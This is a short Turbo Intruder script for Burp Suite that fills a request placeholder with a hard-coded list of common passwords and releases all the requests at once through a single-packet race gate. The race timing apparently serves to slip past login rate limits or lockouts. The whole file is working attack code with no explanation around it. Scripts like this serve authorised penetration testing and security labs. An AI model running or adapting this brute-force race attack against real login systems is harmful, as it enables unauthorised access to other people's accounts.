def queueRequests(target, wordlists):
    # Define your wordlist directly in the script, dont forget to add the placeholder in your request with %s
    my_wordlist = [
        "password",
        "admin",
        "123456",
        "qwerty",
        "letmein",
        "welcome",
        "test",
        "secret",
        # Add more words as needed
        "password123",
        "admin123"
    ]
    
    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # Iterate through each word in your custom wordlist
    for word in my_wordlist:
        # For %s placeholder, use the correct parameter format
        engine.queue(target.req % word, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
